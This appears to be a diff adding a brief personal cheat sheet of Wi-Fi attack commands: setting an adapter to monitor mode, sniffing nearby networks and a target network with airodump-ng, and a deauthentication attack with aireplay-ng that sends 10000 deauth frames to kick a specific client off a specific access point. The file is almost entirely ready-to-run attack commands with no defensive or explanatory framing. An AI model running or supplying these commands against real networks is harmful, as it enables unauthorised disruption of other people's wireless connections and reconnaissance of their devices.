@@ -1,0 +1,17 @@
+# Set your wifi adaper to monitor mode
+
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+# Packet Sniffing - Used to display all wireless network around us
+
+airodump-ng wlan0
+
+# Target Packet Sniffing - Used to connected device MAC of our target network
+
+airodump-ng --bssid F8:23:B2:B9:50:AB --channel 2 wlan0
+
+# Deauthentication Attack - uused to kick off any device from wifi
+
+aireplay-ng --deauth 10000 -a F8:23:B2:B9:50:AB -c DC:45:D5:67:B9:67 wlan0
